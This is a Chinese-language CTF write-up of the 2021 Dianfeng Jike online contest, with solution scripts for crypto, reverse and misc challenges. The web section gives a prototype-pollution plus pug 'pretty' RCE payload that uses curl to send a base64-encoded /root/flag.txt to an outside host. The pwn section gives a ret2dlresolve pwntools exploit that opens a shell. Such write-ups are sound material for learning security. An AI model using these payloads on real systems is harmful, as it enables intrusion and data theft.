# 巅峰极客线上赛部分WP

阅读量 **143717**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-08-06 16:30:10

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## misc

###  1、签到

说了GAME，所以AES密钥为GAME，到<https://aghorler.github.io/emoji-aes/> emjio-aes解密即可

![](https://p1.ssl.qhimg.com/t01919df93bb733a023.png)

flag{10ve_4nd_Peace}

## Crypto

###  1、MedicalImage

分析给出的代码，读入图片后首先对一些位进行了互换，然后进行异或加密，而异或加密的初始密钥是随机生成的，但是生成两个随机数都是有一定范围的，所以可以遍历所有可能，对图片进行解密

    
    
    from decimal import *
    from math import log
    from PIL import Image
    import numpy as np
    getcontext().prec = 20
    
    def f1(x):
        # It is based on logistic map in chaotic systems
        # 它基于混沌系统中的logistic映射
        # The parameter r takes the largest legal value
        # 参数r取最大的合法值
        assert(x>=0)
        assert(x<=1)
        return x * 4 * (1 - x)
    
    
    def f2(x):
        # same as f1
        assert(x>=0)
        assert(x<=1)
        return x * 4 * (1 - x)
    
    
    def f3(x):
        # same as f1
        assert(x>=0)
        assert(x<=1)
        return x * 4 * (1 - x)
    
    
    def decryptImage(pic,size,config):
        w,h = size
        r1 = Decimal('0.478706063089473894123')
        r2 = Decimal('0.613494245341234672318')
        r3 = Decimal('0.946365754637812381837')
        for i in range(200):
            r1 = f1(r1)
            r2 = f2(r2)
            r3 = f3(r3)
        const = 10**14
        p0,c0=config
        for x in range(w):
            for y in range(h):
                k = int(round(const*r3))%256
                k = bin(k)[2:].ljust(8,'0')         # bin()函数返回二进制形式，并对齐为8位形式，位数不够前补0
                k = int(k[p0%8:]+k[:p0%8],2)
                r3 = f3(r3)
                p0 = ((pic[y,x]^c0^k)-k)%256
                c0 = pic[y,x]
                pic[y,x] = p0
        # 互换
        count = 0       #
        pos_list = []
        for x in range(w):
            for y in range(h):
                x1 = int(round(const*r1))%w         # round()函数四舍五入
                y1 = int(round(const*r2))%h
                pos_list.append((x1, y1))
                r1 = f1(r1)
                r2 = f2(r2)
                count += 1      #
        count -= 1
        for x in range(w-1,-1,-1):
            for y in range(h-1,-1,-1):
                x1,y1 = pos_list[count]
                tmp = pic[y,x]
                pic[y,x] = pic[y1,x1]
                pic[y1,x1] = tmp
                count -= 1
        return pic,size
    
    
    def outputImage(path,pic,size):
        im = Image.new('P', size,'white')
        pixels = im.load()
        for i in range(im.size[0]):
            for j in range(im.size[1]):
                pixels[i,j] = (int(pic[j][i]))
    
        im.save(path)
    
    
    if __name__ == '__main__':
        dec_img = 'flag_enc.bmp'
        out_im = 'flag_dec'
        im = Image.open(dec_img)
        size = im.size
        pic  = np.array(im) 
        im.close()
        k = 0
        for i in range(100, 105):
            for j in range(200, 205):
                config = (i, j)
                de_pic, de_size = decryptImage(pic, size, config)
                temp_out_im = out_im + str(k) + '.bmp'
                k += 1
                outputImage(temp_out_im,de_pic,de_size)
    

![](https://p3.ssl.qhimg.com/t01dd003b19e9b42615.png)

###  2、learnSM4

这道题是非预期解，两次暴力破解sha256即可。第一次需要破解4位，解空间较小，可以使用pwntool中的函数进行破解，第二次需要破解10位，使用在线破解网站[https://www.cmd5.com/进行破解（需要付费）](https://www.cmd5.com/%E8%BF%9B%E8%A1%8C%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%9C%80%E8%A6%81%E4%BB%98%E8%B4%B9%EF%BC%89)

    
    
    import socket
    from pwn import *
    from pwnlib.util.iters import mbruteforce
    from hashlib import sha256
    
    
    def main():
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.connect(('47.104.94.208', 54740))
        msg = sk.recv(1024).decode()
        suffix = msg[12:msg.find(')')]
        cipher = msg[msg.find('==') + 3:-1]
        msg = sk.recv(1024).decode()
        proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed')
        sk.send((proof + '\n').encode())
        msg = sk.recv(1024).decode()
        msg = sk.recv(1024).decode()
        cipher = msg[10:msg.find('\n')]
        print(cipher)
        for i in range(8):
            sk.send('1\n'.encode())
            msg = sk.recv(1024).decode()
            sk.send('1\n'.encode())
            msg = sk.recv(1024).decode()
            sk.send('a\n'.encode())
            msg = sk.recv(1024).decode()
            msg = sk.recv(1024).decode()
        print(msg)
        answer = input()
        sk.send(answer.encode())
        flag = sk.recv(1024).decode()
        print(flag)
    
    
    if __name__ == '__main__':
        main()
    

![](https://p5.ssl.qhimg.com/t015c1d9e3859d070c1.png)

![](https://p5.ssl.qhimg.com/t01a0cbd69aa11afb92.png)

flag{a722626d-0775-4976-bf3e-36ad965c031a}

###  3、crtrsa

![](https://p1.ssl.qhimg.com/t0106d3815535f54ea0.png)

exp：

    
    
    from gmpy2 import *
    
    e = 2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887
    n = 6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983
    c = 4082777468662493175049853412968913980472986215497247773911290709560282223053863513029985115855416847643274608394467813391117463817805000754191093158289399
    
    for dp in range(1,1<<20):
        a = 114514
        p = gcd(pow(a,e*dp-1,n)-1,n)
        if p != 1:
            q = n / p
            break
    
    d = invert(e,(p-1)*(q-1))
    print hex(pow(c,d,n))[2:].decode('hex')
    

flag{d67fde91-f6c0-484d-88a4-1778f7fa0c05}

## web

###  1、ezjs

随便输入写什么，都能登陆，登陆进去,,点击提交，出现可以query参数

    
    
    ?newimg=.%2Fimages%2F1.png
    

尝试发现任意文件读，同时根据报错信息，拿到入口文件index.js位置`/app/routes/index.js`

    
    
    var express = require('express');
    var router = express.Router();
    var {body, validationResult} = require('express-validator');
    var crypto = require('crypto');
    var fs = require('fs');
    var validator = [
      body('*').trim(),
      body('username').if(body('username').exists()).isLength({min: 5})
      .withMessage("username is too short"),
      body('password').if(body('password').exists()).isLength({min: 5})
      .withMessage("password is too short"),(req, res, next) => {
            const errors = validationResult(req)
            if (!errors.isEmpty()) {
          return res.status(400).render('msg', {title: 'error', msg: errors.array()[0].msg});
            }
            next()
        }
    ];
    
    router.use(validator);
    
    
    router.get('/', function(req, res, next) {
      return res.render('index', {title: "登录界面"});
    });
    
    
    router.post('/login', function(req, res, next) {
      let username = req.body.username;
      let password = req.body.password;
      if (username !== undefined && password !== undefined) {
    
        if (username == "admin" && password === crypto.randomBytes(32).toString('hex')) {
          req.session.username = "admin";
        } else if (username != "admin"){
          req.session.username = username;
    
    
        } else {
          return res.render('msg',{title: 'error', msg: 'admin password error'});
        }
        return res.redirect('/verify');
      }
    
      return res.render('msg',{title: 'error',msg: 'plz input your username and password'});
    });
    
    
    
    router.get('/verify', function(req, res, next) {
      console.log(req.session.username);
      if (req.session.username === undefined) {
        return res.render('msg', {title: 'error', msg: 'login first plz'});
      }
      if (req.session.username === "admin") {
        req.session.isadmin = "admin";
      } else {
        req.session.isadmin = "notadmin";
      }
      return res.render('verify', {title: 'success', msg: 'verify success'});
    });
    
    
    
    
    
    router.get('/admin', function(req, res, next) {
      //req.session.debug = true;
    
      if (req.session.username !== undefined && req.session.isadmin !== undefined) {
    
        if (req.query.newimg !== undefined) req.session.img = req.query.newimg;
    
        var imgdata = fs.readFileSync(req.session.img? req.session.img: "./images/1.png");
        var base64data = Buffer.from(imgdata, 'binary').toString('base64');
    
        var info = {title: '我的空间', msg: req.session.username, png: "data:image/png;base64," + base64data, diy: "十年磨一剑😅v0.0.0(尚处于开发版"};
    
    
        if (req.session.isadmin !== "notadmin") {
    
          if (req.session.debug !== undefined && req.session.debug !== false) info.pretty = req.query.p;
          if (req.query.diy !== undefined) req.session.diy = req.query.diy;
          info.diy = req.session.diy ? req.session.diy: "尊贵的admin";
          return res.render('admin', info);
        } else {
          return res.render('admin', info);
        }
      } else {
        return res.render('msg', {title: 'error', msg: 'plz login first'});
      }
    });
    
    module.exports = router;
    

还有hint文件

    
    
    使用tac命令即可拿到flag，以及flag在/root/flag.txt
    
    
    
     if (req.session.debug !== undefined && req.session.debug !== false) info.pretty = req.query.p;
    

以上代码也很可以，凭空整出一个p参数

查询得知 ，pretty存在代码注入漏洞，参考[Code injection vulnerability in visitMixin and
visitMixinBlock through “pretty” option
#3312](https://github.com/pugjs/pug/issues/3312)

但是，后面这个p参数要生效首先需要admin权限，即前面的判断条件

    
    
    req.session.debug !== undefined && req.session.debug !== false
    req.session.isadmin !== "notadmin"
    

都成立，这个判断条件的漏洞不符合常理，让这些量为已定义的空值就可以

查阅资料发现`express-validator`的特定版本中是存在原型链污染的，参考博客[express-validator 6.6.0
原型链污染分析](https://www.h5w3.com/199802.html)

**payload**

首先，任意登陆一个账户，保持会话，向`/login`发送post数据

    
    
    "].__proto__["isadmin
    

再次发送

    
    
    "].__proto__["debug
    

这样就能提升成为admin用户，然后向`/admin`路由发送query参数p，使用进行rce

    
    
    ');process.mainModule.constructor._load('child_process').exec('curl http://ip:port/?a=`tac /root/flag.txt|base64`');_=('
    

![](https://lisper.oss-cn-beijing.aliyuncs.com/picgo/20210731185728.png-WuarpUXJ)

flag{d18fbbe1-6e32-4bbf-b076-f396f9961e49}

## pwn

###  1、mimic game

题目给了一个observer，原理是以mimic32作为子进程，另外从mimicpy,mimicgo两个程序中任选一个，也作为另一个子进程：

![](https://p4.ssl.qhimg.com/t019b09ffa1d3685f26.png)

在mimic32里面发现了栈溢出的漏洞点：

![](https://p4.ssl.qhimg.com/t01f790ce51b514cc43.png)

看一下Mimic32开的保护：

![](https://p4.ssl.qhimg.com/t012e048537deb83270.png)

所以可以直接用 ret2dlresolve:

注意最后因为不能直接用标准输出，所以要进行重定向: 1>$2

exp：

    
    
    from pwn import *
    
    # sh = process("./obs")
    sh = remote("47.104.94.208", 33865)
    libc = ELF("./libc-2.23.so.x86")
    
    context.binary = elf = ELF('./mimic32')
    rop = ROP(context.binary)
    dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh 1>&2"])
    rop.read(0,dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()
    # print raw_rop
    
    payload = flat({48:raw_rop,80:dlresolve.payload})
    print payload
    print len(payload)
    payload = '\x00'*48 + payload[48:]
    
    
    sleep(0.1)
    sh.sendline('1')
    sleep(0.5)
    sh.send(payload)
    sh.interactive()
    

![](https://p4.ssl.qhimg.com/t01dbec458acbdcd52b.png)

flag{mim1c_s_fl4g}

## Re

###  1、baby_maze

迷宫题，运行如下exp:

    
    
    from idc import *
    from idautils import *
    
    def run_one(addr, paths, flag):
        count = 0
        found = False
        to_handle_refs = []
        for xref in XrefsTo(addr, 0):
            count += 1
            cur_fm = xref.frm
            cur_start = idc.get_func_attr(cur_fm, FUNCATTR_START)
            if cur_start not in paths:
                fm = cur_fm
                fun_start = cur_start
                found = True
                to_handle_refs.append((fm, fun_start))
    
        if found:
            rets = []
            for fm, fun_start in to_handle_refs:
                case_ea = fm - 5
                comment = idc.get_cmt(case_ea, 1)
                assert 'case' in comment
                c = (chr(int(comment.split('case')[1])))
                rets.append((c, fun_start))
            return rets
    
        return None
    
    start = 0x54DE35
    addr = start
    paths = []
    flag = ''
    queue = [(addr, paths, flag)]
    
    while len(queue) > 0:
        new_queue = []
        #print ('queue=%d, len=%d' %(len(queue), len(queue[0][2])))
        for addr, paths, flag in queue:
            #print ('%x' %(addr))
            rets = run_one(addr, paths, flag)
            #print ('ret=%s' %rets)
            if rets is None:
                continue
            for c, next_fun in rets:
                if next_fun == 0x40187c:
                    print ('succ:S%s' %(flag+c)[::-1])
                    continue
                new_queue.append((next_fun, paths+[addr], flag+c))
    
        queue = new_queue.copy()
    
    
    import hashlib
    print (hashlib.md5(b'SSSSSSSSSDDDDDDWWWWAAWWAAWWDDDDDDDDDDDDDDDDDDDDSSDDSSAASSSSAAAAWWAAWWWWAASSSSSSAASSDDSSSSDDWWWWDDSSDDDDWWDDDDDDWWAAAAWWDDDDWWAAWWWWDDSSDDSSSSSSSSSSDDDDSSAAAASSSSSSAASSSSAAWWAASSSSDDDDDDDDDDSSDDSSAASSSSAASSSSSSSSDDWWWWWWDDWWWWDDWWWWDDSSSSSSSSAASSSSDDDDSSDDDDWWDDSSDDSSDDDDDDDDSSDDSSSSDDDDSSDDSSSSSSDDSSSSDDDDSSSSDDDDDDSSSSDDSSDSSASSSSAASSDDSSAASSDDDDDDSSDDDDWWDDSSSSSSDDDDWWAAWWWWDDDDSSSSDDDDDDSSAASSSSSSDDDDDDDDSSDDDDSSSSSSDDWWDDDDDDSSSSSSSSAASSDDSSSSSSAASSDDS').hexdigest())
    

flag{078c8fbc1d0d033f663dcc58e899c101}

###  2、medical_app

感觉就一个RC4和一个XXtea

xx-tea脚本如下：

    
    
     #include <stdio.h>
    #include <stdint.h>
    #define DELTA 0x9F5776B6
    #define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)^e] ^ z)))
    
    void btea(uint32_t *v, int n, uint32_t const key[4])
    {
        uint32_t y, z, sum;
        unsigned p, rounds, e;
        if (n > 1)            /* Coding Part */
        {
            rounds = 6 + 52/n;
            sum = 0;
            z = v[n-1];
            do
            {
                sum += DELTA;
                e = (sum >> 2) & 3;
                for (p=0; p<n-1; p++)
                {
                    y = v[p+1];
                    z = v[p] += MX;
                }
                y = v[0];
                z = v[n-1] += MX;
            }
            while (--rounds);
        }
        else if (n < -1)      /* Decoding Part */
        {
            n = -n;
            rounds = 6 + 52/n;
            sum = rounds*DELTA;
            y = v[0];
            do
            {
                e = (sum >> 2) & 3;
                for (p=n-1; p>0; p--)
                {
                    z = v[p-1];
                    y = v[p] -= MX;
                }
                z = v[n-1];
                y = v[0] -= MX;
                sum -= DELTA;
            }
            while (--rounds);
        }
    }
    
    
    int main()
    {
        unsigned int v[9] = { 0x68e5973e,0xc20c7367,0x98afd41b,0xfe4b9de2,0x1a5b60b,0x3d36d646,0xdbcc7baf,0xa0414f00,0x762ce71a};
        uint32_t const k[4]= {0x1,0x10,0x100,0x1000};
        int n= 9; //n的绝对值表示v的长度，取正表示加密，取负表示解密
        // v为要加密的数据是两个32位无符号整数
        // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位
    
        btea(v, -n, k);
        unsigned char* yk= reinterpret_cast<unsigned char *>((char *) v);
        for(int i=0;i<36;i++)
        {
    
            printf("%0.2x",*(yk+i));
        }
    
    
        return 0;
    }
    

之后在线进行RC4解密

![](https://p4.ssl.qhimg.com/t0170de63ac170737ca.png)

flag{194836950ae9df840e8a94348b901a}

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **chen@@** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/249117](/post/id/249117)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg) chen@@

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

